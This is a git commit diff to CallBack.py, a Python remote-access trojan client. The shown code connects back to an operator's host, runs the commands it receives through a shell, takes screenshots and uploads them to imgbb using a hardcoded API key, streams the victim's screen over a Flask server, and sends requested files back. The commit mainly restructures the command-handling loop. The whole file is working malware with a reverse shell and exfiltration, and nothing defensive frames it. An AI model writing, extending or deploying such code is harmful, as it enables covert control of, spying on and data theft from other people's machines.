97cf37f7f5e3310c7be6aa49a23ee4a6dd34183a
jac11 <jac11devel@gmail.com>
2024-03-21 18:08:52 -0400

    Update CallBack.py

--- CallBack.py
+++ CallBack.py
@@ -16,7 +16,7 @@ hostname = socket.gethostname()
 IPaddress = socket.gethostbyname(hostname)
 Port = int(6655)
 Stopthread = 0
-KeyWord = ['Stream' ,'screenshot' ,'quit','cd','getfile']
+KeyWord = ["'stream'" ,"'screenshot'" ,"'quit'","'cd'","'getfile'"]
 class CallMeBack:
     def __init__(self):
         global Stopthread
@@ -47,84 +47,74 @@ class CallMeBack:
         def index():                      
             return Response(generate_frames(), mimetype='multipart/x-mixed-replace; boundary=frame')
         if __name__=='__main__':
-            #sys.stdout = sys.stdout.flush()
+            sys.stdout = sys.stdout.flush()
             app.run(host='0.0.0.0',port=int(f'{Port}'),debug=False)
             
     def __Socket_SockClinet(self,LHOST=LHOST,LPORT=LPORT):
-        global Stopthread
+        
+        global Stopthread       
         SendBack=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
         SendBack.connect((LHOST,LPORT))
         path = os.getcwd()+ ' > '
-        SendBack.sendall(bytes(path.encode()))
-        
+        SendBack.sendall(bytes(path.encode()))     
         while True :
             data = SendBack.recv(4096).decode('latin-1')
             try:
                 Data = subprocess.run(data,shell=True,capture_output=True)
                 path = os.getcwd()+ ' > '  
-                if data in KeyWord:
-                    pass
-                else:
-                    if 'returncode=1' in str(Data) and not KeyWord:
+                if 'quit' in data:
+                    break
+                elif 'cd' in data:
+                    try:
+                        os.chdir(str(" ".join(data.split()[1:])))
+                        path = os.getcwd()+ ' > '
+                    except Exception:
+                         continue
+                elif 'screenshot' in data :
+                    snapshot = ImageGrab.grab() 
+                    file =os.environ["appdata"]+'\\'+"IMage.jpg"
+                    snapshot.save(file)
+                    with open(os.environ["appdata"]+'\\'+"IMage.jpg", "rb") as file:
+                        url = "https://api.imgbb.com/1/upload"
+                        payload = {
+                            "expiration": "600",
+                            "key":"b205eda46389c875c103903a9adb1b3f",
+                            "image": base64.b64encode(file.read()),
+                        }
+                        res = requests.post(url, payload)
+                        respones =res.text.split('url')
+                        respones = respones[2].split(',')[0].replace('"','').replace(':','',1).replace('\\','')+'\n'   
+                        SendBack.sendall(bytes(path.encode())), SendBack.sendall(bytes(respones.encode()))
+                        SendBack.sendall(bytes(path.encode()))          
+                elif 'stream' in data:
+                    Link = 'http://'+f'{IPaddress}'+':'+str(Port)
+                    SendBack.sendall(bytes(path.encode())), SendBack.sendall(bytes(Link.encode()+'\n'.encode('latin-1')))
+                    SendBack.sendall(bytes(path.encode()))
+                    thread = threading.Thread(target=self.StreamChannel)  
+                    thread.start()
+                    continue
+                elif 'kill' in data:
+                    Stopthread = 1              
+                    StreamStop = 'Stream is End\n'.encode('latin-1')  
+                    SendBack.sendall(bytes(path.encode())), SendBack.sendall(bytes(StreamStop))
+                    SendBack.sendall(bytes(path.encode()))
+                elif 'getfile' in data :
+                    data = data.split()
+                    with open(str("".join(data[-1])),'rb') as FileData:
+                        FileData = FileData.read()     
+                        SendBack.send(len(FileData).to_bytes(4, byteorder='big'))
+                        SendBack.sendall(FileData)
+                elif 'returncode=1' in str(Data) :
                        Except = str(data) +' not recognized as an internal or external command'.replace('\n','')
                        SendBack.sendall(bytes(path.encode())), SendBack.sendall(Except.encode()+'\n'.encode('latin-1'))
-                       SendBack.sendall(bytes(path.encode()))
-                if str(Data) ==  None:
+                       SendBack.sendall(bytes(path.encode())) 
+  
+                else:
+                     Data =bytes(Data.stdout.decode('latin-1').encode())
+                     SendBack.sendall(Data)
                      SendBack.sendall(bytes(path.encode()))
-                if 'cd' in data :
-                        pass
-                else:  
-                        Data =bytes(Data.stdout.decode('latin-1').encode())
-                        SendBack.sendall(Data)
-                        SendBack.sendall(bytes(path.encode()))
-            except Exception  :
-                continue
-            if 'quit' in data:
-                break
-            if 'cd' in data:
-                try:
-                    os.chdir(str(" ".join(data.split()[1:])))
-                    path = os.getcwd()+ ' > '
-                except Exception:
-                    continue
-            if 'screenshot' in data :      
-                snapshot = ImageGrab.grab() 
-                file =os.environ["appdata"]+'\\'+"IMage.jpg"
-                snapshot.save(file)
-                with open(os.environ["appdata"]+'\\'+"IMage.jpg", "rb") as file:
-                    url = "https://api.imgbb.com/1/upload"
-                    payload = {
-                        "expiration": "600",
-                        "key":"b205eda46389c875c103903a9adb1b3f",
-                        "image": base64.b64encode(file.read()),
-                    }
-                    res = requests.post(url, payload)
-                    respones =res.text.split('url')
-                    respones = respones[2].split(',')[0].replace('"','').replace(':','',1).replace('\\','')+'\n'   
-                    SendBack.sendall(bytes(path.encode())), SendBack.sendall(bytes(respones.encode()))
-                    SendBack.sendall(bytes(path.encode()))
-                    
-            if 'stream' in data:
-                Link = 'http://'+f'{IPaddress}'+':'+str(Port)
-                SendBack.sendall(bytes(Link.encode()+'\n'.encode('latin-1')))
-               # SendBack.sendall(bytes(path.encode()))
-                thread = threading.Thread(target=self.StreamChannel)  
-                thread.start()  
-            if 'kill' in data:
-                Stopthread = 1              
-                StreamStop = 'Stream is End'.encode('latin-1') 
-                SendBack.sendall(bytes(StreamStop))
-                #SendBack.sendall(bytes(path.encode()))
-            if 'getfile' in data :
-                data = data.split()
-                with open(str("".join(data[-1])),'rb') as FileData:
-                    FileData = FileData.read()
-                SendBack.send(len(FileData).to_bytes(4, byteorder='big'))
-                SendBack.sendall(FileData)
-
-
-
-
+            except Exception :
+               continue 
 
 
 if __name__=='__main__':
